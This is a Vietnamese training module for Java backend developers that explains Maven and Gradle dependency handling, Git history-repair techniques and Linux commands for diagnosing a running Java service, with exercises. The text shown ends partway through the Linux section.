# Module 16 — Build, Git, Docker, Kubernetes, CI/CD, Observability & Security

> **Mục tiêu:** sau module này bạn giải thích được cơ chế build của Maven/Gradle (lifecycle, dependency mediation, BOM) và xử lý được xung đột dependency; làm chủ Git ở mức cứu được lịch sử (rebase, cherry-pick, bisect, reflog); dùng Linux để chẩn đoán một service Java đang gặp sự cố; đóng gói Spring Boot thành image nhỏ, an toàn, khởi động nhanh và hiểu JVM hành xử thế nào trong container; deploy lên Kubernetes với probes, resources, graceful shutdown đúng; thiết kế pipeline CI/CD có quality & security gate; dựng observability (log, metric, trace, SLO); nhận diện và phòng chống các lỗ hổng OWASP Top 10 trong ứng dụng Java; và dẫn dắt xử lý sự cố + postmortem.
> **Cấp độ:** Cơ bản → Nâng cao (Senior)
> **Thời lượng gợi ý:** 8 ngày (≈ 40–45 giờ)
> **Yêu cầu trước:** Module Java Core, JVM & GC, Spring Boot, Microservices, Module 15 (Testing).
> **Nguồn tham khảo:**
> - Trong kho: [`Ebook IT/Docker - Up _ Running.pdf`](../../Ebook%20IT/Docker%20-%20Up%20_%20Running.pdf) — các chương về Docker image (Dockerfile, layer, build cache), làm việc với container, và Docker trong production.
> - Trong kho: [`Ebook IT/Kubernetes Microservices with Docker .pdf`](../../Ebook%20IT/Kubernetes%20Microservices%20with%20Docker%20.pdf) — Pod, Replication/Deployment, Service, scaling microservice trên Kubernetes.
> - Trong kho: [`Ebook IT/Linux Essential.pdf`](../../Ebook%20IT/Linux%20Essential.pdf) — dòng lệnh, file, quyền, process, xử lý văn bản (grep, pipe, redirection).
> - Trong kho: [`Ebook IT/Pro Linux System Administration.pdf`](../../Ebook%20IT/Pro%20Linux%20System%20Administration.pdf) — quản lý process & service, networking, logging, giám sát hệ thống.
> - Ngoài: [Maven — Introduction to the Build Lifecycle](https://maven.apache.org/guides/introduction/introduction-to-the-lifecycle.html), [Maven — Dependency Mechanism](https://maven.apache.org/guides/introduction/introduction-to-dependency-mechanism.html), [Gradle User Manual](https://docs.gradle.org/current/userguide/userguide.html), [Pro Git](https://git-scm.com/book/en/v2), [Docker docs — Build best practices](https://docs.docker.com/build/building/best-practices/), [Spring Boot — Container Images](https://docs.spring.io/spring-boot/reference/packaging/container-images/index.html), [Kubernetes docs](https://kubernetes.io/docs/), [Spring Boot Actuator — Kubernetes probes](https://docs.spring.io/spring-boot/reference/actuator/endpoints.html), [OpenTelemetry Java](https://opentelemetry.io/docs/languages/java/), [Micrometer](https://docs.micrometer.io/micrometer/reference/), Google *Site Reliability Engineering* & *The Site Reliability Workbook* (chương SLO, alerting on SLOs, postmortem culture), [OWASP Top 10](https://owasp.org/Top10/), [OWASP ASVS](https://owasp.org/www-project-application-security-verification-standard/), [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/).

## Mục lục
1. [Maven: lifecycle, dependency, BOM, multi-module](#p1)
2. [Gradle và so sánh với Maven](#p2)
3. [Git: workflow, rebase vs merge, cứu lịch sử](#p3)
4. [Linux essentials cho backend developer](#p4)
5. [Docker cho ứng dụng Spring Boot](#p5)
6. [JVM trong container](#p6)
7. [Kubernetes cho developer](#p7)
8. [Thiết kế pipeline CI/CD](#p8)
9. [Observability trong thực tế](#p9)
10. [Application security: OWASP Top 10 cho Java](#p10)
11. [Supply chain, secrets management & TLS](#p11)
12. [Xử lý sự cố & văn hóa postmortem](#p12)
13. [Dự án mini của module](#du-an-mini)
14. [Checklist tự đánh giá](#checklist-tu-danh-gia)

---

<a id="p1"></a>
## 1. Maven: lifecycle, dependency, BOM, multi-module

### 1.1 Lifecycle, phase, goal
Maven có **3 lifecycle** dựng sẵn: `clean`, `default` (build), `site`. Mỗi lifecycle là chuỗi **phase** theo thứ tự. Các phase chính của `default`:

```
validate → compile → test-compile → test → package → integration-test → verify → install → deploy
          (process-resources, generate-sources ... là các phase phụ xen giữa)
```

- **Phase** chỉ là một mốc; tự nó không làm gì. **Goal** là một tác vụ cụ thể của plugin (`compiler:compile`, `surefire:test`, `jar:jar`). Goal được **bind** vào phase — theo packaging (`jar` bind sẵn `compiler:compile` vào `compile`, `surefire:test` vào `test`, `jar:jar` vào `package`…) hoặc bằng `<execution>` trong POM.
- Gọi một phase = chạy **mọi phase trước nó** trong lifecycle: `mvn verify` chạy compile, test, package, integration-test, verify. `mvn install` thêm bước copy artifact vào `~/.m2/repository`.
- Gọi một goal trực tiếp chỉ chạy goal đó: `mvn dependency:tree`, `mvn spring-boot:run`.
- `mvn clean verify` = lifecycle `clean` (đến phase `clean`) rồi `default` đến `verify`.

**Surefire vs Failsafe:** Surefire chạy unit test ở phase `test` (`*Test`, `*Tests`, `Test*`, `*TestCase`), fail ngay. Failsafe chạy integration test (`*IT`, `IT*`, `*ITCase`) ở `integration-test` và chỉ báo lỗi ở `verify` → `post-integration-test` (dọn môi trường) vẫn kịp chạy. Vì vậy trong CI hãy chạy `mvn verify`, không phải `mvn integration-test`.

> 💡 **Góc nhìn Senior:** Trong CI, **không** dùng `mvn install` nếu không cần — nó ghi vào local repo dùng chung, gây ô nhiễm giữa các build song song. `mvn -B verify` (batch mode) là đủ; deploy artifact bằng `mvn deploy` ở stage riêng. Trên dev machine, `mvn install` trong multi-module thường chỉ là cách chữa cháy cho việc không chạy từ root (`mvn -pl module-a -am verify` tốt hơn).

### 1.2 Dependency scopes

| Scope | Compile classpath | Test classpath | Runtime / đóng gói | Truyền tiếp (transitive) | Ví dụ |
|---|---|---|---|---|---|
| `compile` (mặc định) | ✓ | ✓ | ✓ | ✓ (thành compile) | spring-web |
| `provided` | ✓ | ✓ | ✗ (container cung cấp) | ✗ | `jakarta.servlet-api` khi deploy WAR, Lombok |
| `runtime` | ✗ | ✓ | ✓ | ✓ (thành runtime) | JDBC driver (`postgresql`) |
| `test` | ✗ | ✓ | ✗ | ✗ | junit, mockito |
| `system` | ✓ | ✓ | ✗ | — | JAR trên đĩa (tránh dùng, deprecated về mặt thực hành) |
| `import` | Chỉ dùng trong `<dependencyManagement>` với `<type>pom</type>` để nhập BOM | | | | spring-boot-dependencies |

Ngoài ra `<optional>true</optional>`: dependency không truyền tiếp sang project dùng thư viện của bạn (vd thư viện hỗ trợ cả Jackson và Gson, đánh dấu optional cả hai).

### 1.3 Dependency mediation & conflict
Khi đồ thị dependency có nhiều version của cùng một artifact, Maven chọn **một** theo luật:
1. **Nearest definition wins** — version gần root nhất trong cây (ít bước nhất) thắng.
2. Nếu bằng độ sâu → **first declaration wins** — cái khai báo trước trong POM thắng.

```
my-app
├── lib-a:1.0
│   └── jackson-databind:2.12.0      (depth 2)
└── lib-b:1.0
    └── lib-c:1.0
        └── jackson-databind:2.17.0  (depth 3)
→ Maven chọn 2.12.0 (gần hơn), dù lib-c cần API của 2.17 → NoSuchMethodError lúc runtime!
```

Đây là khác biệt quan trọng với Gradle (chọn **version cao nhất**). Lỗi điển hình xuất hiện **lúc runtime**, không phải compile: `NoSuchMethodError`, `ClassNotFoundException`, `NoClassDefFoundError`, `AbstractMethodError`.

**Công cụ chẩn đoán:**
```bash
mvn dependency:tree -Dincludes=com.fasterxml.jackson.core:jackson-databind
mvn dependency:tree -Dverbose            # hiển thị cả version bị loại ("omitted for conflict with ...")
mvn dependency:analyze                   # used-undeclared & declared-unused
mvn help:effective-pom                   # POM sau khi gộp parent, profile, dependencyManagement
```

**Cách xử lý:**
```xml
<!-- 1. Ghim version qua dependencyManagement (áp cho cả transitive) -->
<dependencyManagement>
  <dependencies>
    <dependency>
      <groupId>com.fasterxml.jackson</groupId>
      <artifactId>jackson-bom</artifactId>
      <version>2.17.2</version>
      <type>pom</type>
      <scope>import</scope>
    </dependency>
  </dependencies>
</dependencyManagement>

<!-- 2. Loại trừ transitive không mong muốn -->
<dependency>
  <groupId>org.springframework.boot</groupId>
  <artifactId>spring-boot-starter-web</artifactId>
  <exclusions>
    <exclusion>
      <groupId>org.springframework.boot</groupId>
      <artifactId>spring-boot-starter-tomcat</artifactId>
    </exclusion>
  </exclusions>
</dependency>

<!-- 3. Fail build nếu cây có version không hội tụ -->
<plugin>
  <groupId>org.apache.maven.plugins</groupId>
  <artifactId>maven-enforcer-plugin</artifactId>
  <executions>
    <execution>
      <id>enforce</id>
      <goals><goal>enforce</goal></goals>
      <configuration>
        <rules>
          <dependencyConvergence/>
          <requireMavenVersion><version>[3.9,)</version></requireMavenVersion>
          <requireJavaVersion><version>[21,)</version></requireJavaVersion>
          <banDuplicatePomDependencyVersions/>
        </rules>
      </configuration>
    </execution>
  </executions>
</plugin>
```

### 1.4 `dependencyManagement` vs `dependencies`, BOM
- `<dependencies>`: **thêm** dependency vào project.
- `<dependencyManagement>`: chỉ **quy định version/scope/exclusion** nếu dependency đó xuất hiện (trực tiếp hoặc transitive); không thêm gì vào classpath. Module con khai báo dependency **không cần version**.
- **BOM (Bill of Materials):** một POM chỉ chứa `dependencyManagement`, được import bằng `scope=import`. Ví dụ: `spring-boot-dependencies`, `jackson-bom`, `junit-bom`, `testcontainers-bom`, `spring-cloud-dependencies`. Đảm bảo một bộ version đã được kiểm thử cùng nhau.
- Spring Boot parent (`spring-boot-starter-parent`) kế thừa `spring-boot-dependencies` + cấu hình plugin. Nếu công ty đã có parent riêng → import `spring-boot-dependencies` như BOM. Override một version: trong parent dùng property (`<jackson-bom.version>`); khi import BOM thì khai báo BOM của thư viện đó **trước** BOM Spring Boot (thứ tự import quan trọng: cái trước thắng).

### 1.5 Multi-module

```
shop/                        (packaging pom, aggregator + parent)
├── pom.xml
├── shop-domain/             (jar, không phụ thuộc Spring)
├── shop-application/        (jar, phụ thuộc domain)
├── shop-infrastructure/     (jar, JPA, Kafka)
└── shop-app/                (Spring Boot app, spring-boot-maven-plugin repackage)
```

```xml
<!-- shop/pom.xml -->
<project>
  <groupId>com.acme</groupId>
  <artifactId>shop</artifactId>
  <version>${revision}</version>
  <packaging>pom</packaging>
  <modules>
    <module>shop-domain</module>
    <module>shop-application</module>
    <module>shop-infrastructure</module>
    <module>shop-app</module>
  </modules>
  <properties>
    <revision>1.4.0-SNAPSHOT</revision>   <!-- CI-friendly version, cần flatten-maven-plugin khi deploy -->
    <java.version>21</java.version>
  </properties>
  <dependencyManagement> <!-- BOM + version các module nội bộ --> </dependencyManagement>
  <build><pluginManagement> <!-- version plugin thống nhất --> </pluginManagement></build>
</project>
```

- **Aggregation** (`<modules>`) ≠ **inheritance** (`<parent>`), thường gộp vào cùng một POM root nhưng là 2 khái niệm.
- Reactor sắp xếp build theo đồ thị phụ thuộc. Lệnh hữu ích: `mvn -pl shop-app -am verify` (build module và những gì nó cần), `-amd` (cả module phụ thuộc vào nó), `-T 1C` (build song song 1 thread/core), `-rf :shop-app` (resume from).
- Chỉ module app dùng `spring-boot-maven-plugin` `repackage`; các module thư viện là jar thường (nếu repackage module thư viện, module khác không dùng được class của nó vì bị đẩy vào `BOOT-INF/classes`).

> ⚠️ **Lỗi thường gặp:**
> - Dùng `SNAPSHOT` của thư viện bên ngoài trong release → build không lặp lại được.
> - Version range (`[1.0,2.0)`) → build hôm nay khác hôm qua.
> - Khai báo version cứng ở module con, lệch với BOM → xung đột âm thầm.
> - Không ghim version plugin → Maven dùng version mặc định cũ (cảnh báo "version for plugin is missing").
> - Repository nội bộ (Nexus/Artifactory) thiếu cấu hình mirror → CI kéo trực tiếp từ Internet, chậm và rủi ro supply chain.

### 🛠 Bài tập phần 1

**Bài 1.1 — Đọc lifecycle (Cơ bản)**
- Đề bài: Tạo project Spring Boot, chạy `mvn help:describe -Dcmd=verify` và `mvn -X verify | grep "\[DEBUG\] Goal:"` (hoặc xem log) để liệt kê goal nào chạy ở phase nào. Thêm một `IT` class và cấu hình Failsafe.
- Tiêu chí: bảng phase → goal; chứng minh `mvn test` không chạy `*IT`, `mvn verify` có chạy.

**Bài 1.2 — Tái hiện và sửa xung đột dependency (Trung bình)**
- Đề bài: Tạo các module thư viện sao cho app gặp `NoSuchMethodError` lúc runtime do nearest-wins: `lib-a` phụ thuộc Guava 19 (độ sâu 2), `lib-c` (đi qua `lib-b`, độ sâu 3) phụ thuộc Guava 31 và dùng API chỉ có ở bản mới. Chẩn đoán bằng `dependency:tree -Dverbose`, sửa bằng `dependencyManagement`, thêm enforcer `dependencyConvergence`.
- Tiêu chí: ghi lại output trước/sau; build fail khi bỏ phần ghim version.

**Bài 1.3 — Tái cấu trúc thành multi-module với BOM nội bộ (Nâng cao)**
- Đề bài: Tách một Spring Boot app thành 4 module như 1.5, tạo thêm module `shop-bom` (packaging pom) công bố version các module nội bộ + BOM bên thứ ba cho các team khác import. Dùng `${revision}` + `flatten-maven-plugin`.
- Tiêu chí: `mvn -T 1C verify` chạy được; module domain không có dependency Spring (kiểm bằng `dependency:tree` hoặc ArchUnit); `mvn -pl shop-app -am verify` chỉ build các module cần.

<details>
<summary>Gợi ý lời giải</summary>

- 1.2: Ví dụ dễ tái hiện với Guava: `lib-a → guava:19.0` (depth 2), `lib-b → lib-c → guava:31.1-jre` (depth 3) và lib-c gọi `com.google.common.collect.ImmutableList.toImmutableList()` (có từ Guava 21). App gọi lib-c → `NoSuchMethodError`. Sửa: `<dependencyManagement>` ghim `guava:33.x-jre` (kiểm tra lib-a còn tương thích).
- 1.3: `flatten-maven-plugin` với `<flattenMode>resolveCiFriendliesOnly</flattenMode>` để POM được deploy chứa version thật thay vì `${revision}`. BOM nội bộ không nên là parent của chính các module (tránh vòng); parent và BOM là 2 artifact riêng.

</details>

---

<a id="p2"></a>
## 2. Gradle và so sánh với Maven

### 2.1 Mô hình của Gradle
- Build script là **code** (Kotlin DSL `build.gradle.kts` hoặc Groovy). Đơn vị là **task**, tạo thành **DAG**; Gradle chỉ chạy task cần thiết cho task được yêu cầu.
- Ba pha: **initialization** (xác định project trong `settings.gradle.kts`) → **configuration** (chạy build script, dựng đồ thị task) → **execution**.
- **Incremental build:** mỗi task khai báo input/output; nếu không đổi → `UP-TO-DATE`, bỏ qua.
- **Build cache** (local/remote): output của task được cache theo hash input → `FROM-CACHE`, kể cả giữa các máy/CI.
- **Configuration cache:** cache kết quả của pha configuration.
- **Gradle Daemon:** JVM chạy nền, giữ JIT/warm state.

```kotlin
// build.gradle.kts
plugins {
    java
    id("org.springframework.boot") version "3.5.0"
    id("io.spring.dependency-management") version "1.1.7"
    jacoco
}

java { toolchain { languageVersion = JavaLanguageVersion.of(21) } }

dependencies {
    implementation("org.springframework.boot:spring-boot-starter-web")
    implementation(platform("software.amazon.awssdk:bom:2.28.0"))   // BOM
    runtimeOnly("org.postgresql:postgresql")
    compileOnly("org.projectlombok:lombok")
    annotationProcessor("org.projectlombok:lombok")
    testImplementation("org.springframework.boot:spring-boot-starter-test")
    testRuntimeOnly("org.junit.platform:junit-platform-launcher")
}

tasks.test {
    useJUnitPlatform()
    maxParallelForks = (Runtime.getRuntime().availableProcessors() / 2).coerceAtLeast(1)
}
```

### 2.2 Configuration: `api` vs `implementation`
- `implementation`: dependency dùng **nội bộ**, không lộ cho consumer compile classpath → đổi nó không buộc module phụ thuộc recompile; tách biệt tốt hơn Maven `compile`.
- `api` (plugin `java-library`): dependency xuất hiện trong public API (kiểu trả về, tham số) → lộ cho consumer.
- `compileOnly` ≈ Maven `provided`; `runtimeOnly` ≈ `runtime`; `testImplementation` ≈ `test`.

### 2.3 Conflict resolution trong Gradle
Mặc định: **chọn version cao nhất** trong đồ thị (optimistic upgrade). Kiểm soát:

```kotlin
dependencies {
    constraints {
        implementation("com.fasterxml.jackson.core:jackson-databind:2.17.2") {
            because("CVE-xxxx trong bản cũ")
        }
    }
    implementation("com.google.guava:guava") {
        version { strictly("33.2.1-jre") }   // ép chính xác, fail nếu không thỏa
    }
}
configurations.all {
    resolutionStrategy.failOnVersionConflict()   // giống enforcer dependencyConvergence
}
```
Chẩn đoán: `./gradlew dependencies --configuration runtimeClasspath`, `./gradlew dependencyInsight --dependency jackson-databind --configuration runtimeClasspath`. Khóa version: **dependency locking** (`./gradlew dependencies --write-locks`) và **version catalog** (`gradle/libs.versions.toml`).

### 2.4 So sánh

| Tiêu chí | Maven | Gradle |
|---|---|---|
| Mô hình | Khai báo (XML), lifecycle cố định | Code (Kotlin/Groovy), DAG task |
| Conflict | Nearest wins | Highest wins (+ constraints, strictly) |
| Tốc độ | Chậm hơn với project lớn; có `-T`, Maven build cache extension | Incremental, build cache, daemon → nhanh hơn rõ ở monorepo lớn |
| Độ dễ đọc/ổn định | Rất chuẩn hóa, mọi project giống nhau | Linh hoạt → dễ thành "script spaghetti" |
| Hệ sinh thái | Lâu đời, plugin phong phú | Android mặc định, Spring Boot hỗ trợ cả hai |
| Tách API/impl | Không (chỉ `compile`) | `api`/`implementation` |

> 💡 **Góc nhìn Senior:** Lựa chọn là trade-off về **khả năng dự đoán** (Maven) vs **hiệu năng & linh hoạt** (Gradle). Với monorepo hàng trăm module, build cache từ xa của Gradle có thể giảm thời gian CI từ 40 phút xuống vài phút. Với team nhỏ, Maven ít bất ngờ hơn. Dù chọn gì: dùng **wrapper** (`mvnw`/`gradlew`) để cố định version tool, ghim version plugin, BOM/version catalog, và build lặp lại được (reproducible: `project.build.outputTimestamp` trong Maven, `isPreserveFileTimestamps = false` trong Gradle).

> ⚠️ **Lỗi thường gặp:** làm việc nặng (gọi mạng, đọc file lớn) trong pha configuration của Gradle → mọi lệnh đều chậm; dùng `allprojects {}` / `subprojects {}` thay vì convention plugin (`buildSrc`/included build) → coupling giữa project; quên `useJUnitPlatform()` → 0 test chạy.

### 🛠 Bài tập phần 2

**Bài 2.1 — Chuyển Maven sang Gradle (Cơ bản)**
- Đề bài: Chuyển project bài 1.1 sang Gradle Kotlin DSL với version catalog. So sánh `runtimeClasspath` của hai bên.
- Tiêu chí: danh sách jar giống nhau (hoặc giải thích khác biệt do conflict resolution).

**Bài 2.2 — Incremental & build cache (Trung bình)**
- Đề bài: Chạy `./gradlew build --scan` (hoặc `--profile`) 3 lần: clean build, build lại không đổi gì, đổi 1 file test. Bật `org.gradle.caching=true`, chạy `clean build` lần nữa.
- Tiêu chí: giải thích `UP-TO-DATE` vs `FROM-CACHE` vs executed cho từng task chính.

**Bài 2.3 — Convention plugin (Nâng cao)**
- Đề bài: Với project multi-module, viết convention plugin trong `build-logic` (included build) áp dụng: Java toolchain 21, JUnit Platform, JaCoCo, Spotless, `failOnVersionConflict`. Mỗi module chỉ còn `plugins { id("acme.java-conventions") }`.
- Tiêu chí: không còn `subprojects {}`; configuration cache bật được mà không lỗi.

<details>
<summary>Gợi ý lời giải</summary>

- 2.2: test task có input là class đã compile + classpath; đổi file test → `compileTestJava` và `test` chạy lại, `compileJava` `UP-TO-DATE`. Sau `clean`, với build cache bật, output được lấy từ cache (`FROM-CACHE`).
- 2.3: `build-logic/src/main/kotlin/acme.java-conventions.gradle.kts` + `settings.gradle.kts` ở root có `pluginManagement { includeBuild("build-logic") }`.

</details>

---

<a id="p3"></a>
## 3. Git: workflow, rebase vs merge, cứu lịch sử

### 3.1 Mô hình dữ liệu cần nhớ
Git lưu **snapshot**, không lưu diff. Commit = (tree snapshot, parent(s), author, message) định danh bởi hash. Branch chỉ là **con trỏ** di động tới một commit; `HEAD` trỏ tới branch hiện tại. Hiểu điều này thì rebase, reset, cherry-pick không còn "ma thuật".

### 3.2 Workflow

**Git Flow** (Vincent Driessen): `main` (production), `develop` (tích hợp), `feature/*`, `release/*`, `hotfix/*`.
- Hợp với: sản phẩm phát hành theo version, nhiều version song song được hỗ trợ (phần mềm cài đặt, thư viện, mobile app).
- Nhược: branch sống lâu → merge hell, tích hợp muộn, không hợp continuous delivery.

**GitHub Flow:** `main` luôn deploy được; branch ngắn từ `main` → PR → review + CI → merge → deploy.

**Trunk-based development:** mọi người tích hợp vào trunk (`main`) ít nhất mỗi ngày; branch sống tối đa 1–2 ngày (hoặc commit thẳng với pair programming); tính năng chưa xong ẩn sau **feature flag**; release bằng tag hoặc release branch cắt từ trunk (chỉ nhận cherry-pick fix).
- Điều kiện tiên quyết: CI nhanh và tin cậy, test tự động tốt, feature flag, văn hóa PR nhỏ.
- Kết quả nghiên cứu DORA (Accelerate) cho thấy trunk-based gắn với hiệu suất giao hàng cao.

> 💡 **Góc nhìn Senior:** Chọn workflow theo **cách bạn release**, không theo trào lưu. SaaS deploy nhiều lần/ngày → trunk-based + feature flag. Thư viện có nhiều major version được bảo trì → release branch. Câu trả lời phỏng vấn tốt nêu được chi phí của feature flag (nợ kỹ thuật, tổ hợp cấu hình cần test, phải dọn flag sau khi rollout).

### 3.3 Merge vs rebase

```
Trước:          A---B---C  main
                     \
                      D---E  feature

git merge:      A---B---C-------M  main      (giữ nguyên lịch sử, thêm merge commit M)
                     \         /
                      D-------E

git rebase main (trên feature):
                A---B---C  main
                         \
                          D'---E'  feature   (D', E' là commit MỚI, hash mới)
```

| | Merge | Rebase |
|---|---|---|
| Lịch sử | Đúng sự thật, có merge commit, đồ thị phức tạp | Tuyến tính, sạch |
| Hash | Không đổi | Viết lại (commit mới) |
| An toàn | An toàn với branch dùng chung | **Không** rebase branch đã push mà người khác dựa vào |
| Conflict | Giải quyết 1 lần | Có thể phải giải quyết nhiều lần (mỗi commit) |

**Luật vàng:** không rebase commit đã public mà người khác đang dùng. Rebase branch cá nhân trước khi mở PR là tốt. Khi buộc phải push sau rebase: `git push --force-with-lease` (từ chối nếu remote có commit mới bạn chưa thấy), **không** dùng `--force`.

Squash merge (GitHub "Squash and merge"): mỗi PR thành 1 commit trên `main` — lịch sử gọn, dễ revert theo PR, nhưng mất commit chi tiết.

```bash
git fetch origin
git rebase -i origin/main      # squash/fixup/reword commit cá nhân trước khi mở PR
# Lưu ý: môi trường không tương tác có thể dùng: git rebase --autosquash với commit "fixup!" tạo bởi git commit --fixup=<sha>
git push --force-with-lease
```

### 3.4 Giải quyết conflict

```bash
git merge feature/x            # hoặc rebase
# CONFLICT (content): Merge conflict in src/main/java/.../PriceService.java
git status                     # liệt kê file conflict
git diff                       # xem chỗ <<<<<<< ======= >>>>>>>
git config --global merge.conflictstyle zdiff3   # hiển thị cả phần gốc (base) -> dễ hiểu hai bên đã đổi gì
# sửa file, chạy build + test
git add src/main/java/.../PriceService.java
git merge --continue           # hoặc git rebase --continue
git merge --abort              # bỏ cuộc, quay về trạng thái trước
```
- `git checkout --ours/--theirs <file>` chọn nguyên một bên (lưu ý: khi **rebase**, "ours" là branch đích (`main`), "theirs" là commit đang được replay — ngược trực giác).
- `git rerere` (reuse recorded resolution): nhớ cách bạn giải quyết conflict để áp lại khi gặp lại (hữu ích khi rebase nhiều lần).
- Conflict ở file sinh tự động (lock file, migration số thứ tự): sinh lại thay vì sửa tay; với Flyway, đổi số version của migration của bạn.
- **Luôn build + chạy test sau khi giải quyết** — merge không conflict về text vẫn có thể conflict về **ngữ nghĩa** (một bên đổi tên method, bên kia thêm lời gọi tới tên cũ).

### 3.5 Cherry-pick, revert, reset, reflog

```bash
git cherry-pick a1b2c3d                 # áp commit từ branch khác vào branch hiện tại (commit mới)
git cherry-pick -x a1b2c3d              # thêm "(cherry picked from commit ...)" vào message -> truy vết
git cherry-pick A^..B                   # một dãy commit

git revert a1b2c3d                      # tạo commit đảo ngược -> an toàn trên branch chung
git revert -m 1 <merge-commit>          # revert merge commit, giữ parent 1

git reset --soft HEAD~1                 # bỏ commit, giữ thay đổi trong staging
git reset --mixed HEAD~1                # (mặc định) giữ thay đổi trong working dir
git reset --hard HEAD~1                 # XÓA thay đổi — nguy hiểm

git reflog                              # nhật ký HEAD đã đi qua đâu -> cứu commit "đã mất" sau reset/rebase
git branch rescue HEAD@{3}
```
Use case cherry-pick điển hình: hotfix đã merge vào `main`, cần đưa vào `release/1.4`. Rủi ro: commit trùng lặp nội dung khác hash → về sau merge 2 branch có thể conflict; cherry-pick commit phụ thuộc commit khác chưa được pick.

### 3.6 `git bisect` — tìm commit gây lỗi bằng tìm kiếm nhị phân

```bash
git bisect start
git bisect bad                 # HEAD đang lỗi
git bisect good v1.3.0         # tag này còn tốt
# Git checkout commit ở giữa; bạn test rồi đánh dấu good/bad... ~log2(N) bước
git bisect run ./mvnw -q -pl shop-app -am test -Dtest=PricingRegressionTest -Dsurefire.failIfNoSpecifiedTests=false
# exit 0 = good, 1..127 (trừ 125) = bad, 125 = skip (không build được)
git bisect reset
```
1000 commit → khoảng 10 bước. Điều kiện: mỗi commit build được (lý do để giữ commit nhỏ, xanh). Viết test tái hiện **trước**, đặt ngoài cây code (file tạm) hoặc dùng script.

> ⚠️ **Lỗi thường gặp:**
> - `git push --force` lên branch chung → xóa commit của người khác.
> - Commit secret (key, password) → `git rm` không đủ, secret vẫn trong lịch sử. Phải **thu hồi/rotate secret ngay**, sau đó mới tính đến việc viết lại lịch sử (`git filter-repo`) — coi như secret đã lộ.
> - Commit khổng lồ "fix stuff" → không bisect, không review, không revert được.
> - Merge `main` vào feature liên tục tạo đồ thị rối; rebase feature cá nhân lên `main` thay vào đó.

### 🛠 Bài tập phần 3

**Bài 3.1 — Rebase interactive và force-with-lease (Cơ bản)**
- Đề bài: Tạo repo, branch `feature` với 5 commit lộn xộn ("wip", "fix typo", ...). Trong khi đó `main` có 2 commit mới. Rebase `feature` lên `main`, gộp còn 2 commit có ý nghĩa, push bằng `--force-with-lease`. Mô phỏng đồng nghiệp đã push thêm vào `feature` để thấy `--force-with-lease` từ chối.
- Tiêu chí: `git log --oneline --graph` tuyến tính; giải thích vì sao lệnh bị từ chối.

**Bài 3.2 — Conflict ngữ nghĩa (Trung bình)**
- Đề bài: Branch A đổi tên `calculateTotal()` thành `total()`; branch B (song song) thêm lời gọi `calculateTotal()` ở file khác. Merge cả hai vào `main`: Git không báo conflict. Thiết lập CI (hoặc hook) phát hiện lỗi; đề xuất quy trình phòng tránh (rebase + chạy CI trên kết quả merge, merge queue).
- Tiêu chí: tái hiện được build đỏ sau merge "sạch"; mô tả merge queue giải quyết vấn đề này thế nào.

**Bài 3.3 — Bisect tự động (Nâng cao)**
- Đề bài: Viết script tạo repo có 200 commit, trong đó commit thứ 137 đưa vào một bug (vd đổi `>=` thành `>` trong hàm tính giảm giá) và 3 commit không build được. Dùng `git bisect run` với script trả 125 cho commit không build được.
- Tiêu chí: bisect tìm đúng commit 137; ghi lại số bước.

<details>
<summary>Gợi ý lời giải</summary>

- 3.1: `GIT_SEQUENCE_EDITOR` có thể dùng để tự động hóa rebase -i trong script; hoặc `git commit --fixup=<sha>` rồi `git rebase -i --autosquash`.
- 3.2: merge queue (GitHub merge queue, GitLab merge trains) chạy CI trên **kết quả merge với main mới nhất** trước khi thật sự merge.
- 3.3:
```bash
#!/usr/bin/env bash
./mvnw -q compile || exit 125
./mvnw -q test -Dtest=DiscountTest || exit 1
exit 0
```

</details>

---

<a id="p4"></a>
## 4. Linux essentials cho backend developer

### 4.1 Process và tài nguyên
Kịch bản thật: "service chậm/treo trên production". Các lệnh cần thuộc:

```bash
ps -ef | grep java                      # liệt kê process java, PID, user, lệnh khởi chạy
ps -o pid,ppid,%cpu,%mem,rss,nlwp,etime,cmd -p <PID>   # nlwp = số thread, rss = bộ nhớ thực (KB)
pgrep -fa 'order-service'

top -H -p <PID>                         # -H: xem từng THREAD trong process -> thread nào ăn CPU
# load average: số task runnable + uninterruptible trung bình 1/5/15 phút; so với số core
htop                                    # tương tác, cây process (F5), lọc (F4)

free -m                                 # RAM; "available" mới là số đáng quan tâm, không phải "free"
vmstat 1 5                              # r (run queue), si/so (swap), wa (IO wait), cs (context switch)
iostat -xz 1                            # %util, await của disk
df -h ; du -sh /var/log/* | sort -h     # đầy đĩa là nguyên nhân sự cố kinh điển
dmesg -T | grep -i -E 'killed process|oom'    # OOM killer của kernel
```

**Tìm thread Java ăn CPU:**
```bash
top -H -p 12345                         # thấy thread TID 12401 dùng 99% CPU
printf '%x\n' 12401                     # -> 3071 (hex)
jstack 12345 | grep -A 20 'nid=0x3071'  # stack của thread đó (jcmd 12345 Thread.print tương đương)
```

**Signals:** `kill -15` (SIGTERM, mặc định) → JVM chạy shutdown hooks (Spring đóng context, graceful shutdown); `kill -9` (SIGKILL) → chết ngay, không dọn dẹp; `kill -3` (SIGQUIT) → JVM in thread dump ra stdout, **không** chết.

### 4.2 Network

```bash
ss -tlnp                                # socket TCP đang LISTEN + process (thay netstat -tlnp)
ss -tan state established '( dport = :5432 )' | wc -l    # số kết nối tới PostgreSQL
ss -tan | awk 'NR>1 {print $1}' | sort | uniq -c          # thống kê trạng thái TCP
ss -s                                   # tổng hợp

curl -v -o /dev/null -s -w 'dns=%{time_namelookup} connect=%{time_connect} tls=%{time_appconnect} ttfb=%{time_starttransfer} total=%{time_total}\n' https://api.partner.com/health
dig +short api.partner.com ; nc -vz db.internal 5432 ; traceroute / mtr db.internal
tcpdump -i any -nn port 8080 -w /tmp/cap.pcap            # bắt gói, mở bằng Wireshark
```
Ý nghĩa trạng thái TCP cần nhớ:
- Nhiều **`TIME_WAIT`** ở phía client: tạo kết nối mới cho mỗi request (không dùng connection pool/keep-alive) → có thể cạn ephemeral port.
- Nhiều **`CLOSE_WAIT`** ở app: phía kia đã đóng nhưng **app của bạn chưa `close()` socket** → rò connection (thường do không đóng response body của HTTP client, hoặc không trả connection về pool).
- `SYN_SENT` treo: không tới được đích (firewall, DNS sai).

### 4.3 File descriptors và giới hạn

```bash
ulimit -n                               # giới hạn FD của shell hiện tại
cat /proc/<PID>/limits | grep 'open files'   # giới hạn THỰC TẾ của process đang chạy
ls /proc/<PID>/fd | wc -l               # số FD đang mở
lsof -p <PID> | awk '{print $5}' | sort | uniq -c | sort -rn   # loại FD: REG (file), IPv4, sock, FIFO
lsof -i :8080                           # ai đang dùng port 8080
lsof +L1                                # file đã xóa nhưng còn bị giữ (đĩa không giải phóng sau khi rm log!)
```
